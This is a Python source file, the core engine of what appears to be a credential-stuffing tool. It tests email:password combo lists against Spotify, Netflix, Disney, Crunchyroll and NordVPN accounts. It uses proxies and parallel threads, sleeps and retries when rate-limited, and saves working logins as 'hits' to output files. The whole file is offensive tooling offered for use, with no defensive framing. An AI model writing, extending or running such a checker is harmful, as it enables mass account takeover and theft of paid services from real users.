"""
checker.py — Core checking engine.
Threaded credential checker with live stats and rate limit handling.
"""

import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

from scripts import print_status, save_hit, load_proxies

stats_lock = threading.Lock()
hits = 0
fails = 0
errors = 0
checked = 0
ratelimits = 0
start_time = 0


SERVICES = {
    "spotify": "scripts.modules.spotify",
    "netflix": "scripts.modules.netflix",
    "disney": "scripts.modules.disney",
    "crunchyroll": "scripts.modules.crunchyroll",
    "nordvpn": "scripts.modules.nordvpn",
}


def check_combo(module, email: str, password: str, proxies: list[str],
                service_name: str, delay: float = 0.5):
    """Check a single combo against a service module."""
    global hits, fails, errors, checked, ratelimits

    result = module.check(email, password, proxies)
    status = result["status"]
    detail = result["detail"]

    with stats_lock:
        checked += 1

    if status == "hit":
        with stats_lock:
            hits += 1
        print_status(f"HIT: {email}:{password[:4]}*** | {detail}", "hit")
        save_hit(service_name, email, password, detail)

    elif status == "fail":
        with stats_lock:
            fails += 1

    elif status == "ratelimit":
        with stats_lock:
            ratelimits += 1
        print_status(f"Rate limited — slowing down", "warning")
        time.sleep(5)
        # Retry once
        result = module.check(email, password, proxies)
        if result["status"] == "hit":
            with stats_lock:
                hits += 1
            print_status(f"HIT (retry): {email}:{password[:4]}*** | {result['detail']}", "hit")
            save_hit(service_name, email, password, result["detail"])
        else:
            with stats_lock:
                fails += 1

    else:
        with stats_lock:
            errors += 1

    time.sleep(delay)


def run_checker(service_name: str, combos: list[tuple[str, str]],
                threads: int = 5, delay: float = 0.5):
    """Run the checker against a specific service."""
    global hits, fails, errors, checked, ratelimits, start_time
    hits = fails = errors = checked = ratelimits = 0
    start_time = time.time()

    # Import the service module
    import importlib
    module_path = SERVICES.get(service_name)
    if not module_path:
        print_status(f"Unknown service: {service_name}", "error")
        return

    module = importlib.import_module(module_path)
    proxies = load_proxies()

    print_status(f"Checking {len(combos)} combos against {service_name.upper()}", "action")
    print_status(f"Threads: {threads} | Delay: {delay}s | Proxies: {len(proxies)}\n", "info")

    # Stats printer thread
    stats_running = True

    def print_stats():
        while stats_running:
            elapsed = time.time() - start_time
            cpm = (checked / max(elapsed, 0.1)) * 60
            hit_rate = (hits / max(checked, 1)) * 100
            print_status(
                f"Checked: {checked}/{len(combos)} | Hits: {hits} | Fails: {fails} | "
                f"Errors: {errors} | CPM: {cpm:.0f} | Hit rate: {hit_rate:.1f}%",
                "info"
            )
            time.sleep(3)

    stats_thread = threading.Thread(target=print_stats, daemon=True)
    stats_thread.start()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for email, password in combos:
            future = executor.submit(
                check_combo, module, email, password, proxies, service_name, delay
            )
            futures.append(future)

        for f in as_completed(futures):
            pass

    stats_running = False
    elapsed = time.time() - start_time

    print_status("=" * 50, "info")
    print_status(f"COMPLETE — {service_name.upper()}", "success")
    print_status(f"Checked: {checked} | Hits: {hits} | Fails: {fails} | Errors: {errors}", "info")
    print_status(f"Hit rate: {(hits / max(checked, 1)) * 100:.1f}% | Time: {elapsed:.0f}s", "info")
    if hits > 0:
        from scripts import OUTPUT_DIR
        print_status(f"Hits saved to: output/{service_name}_hits.txt", "success")
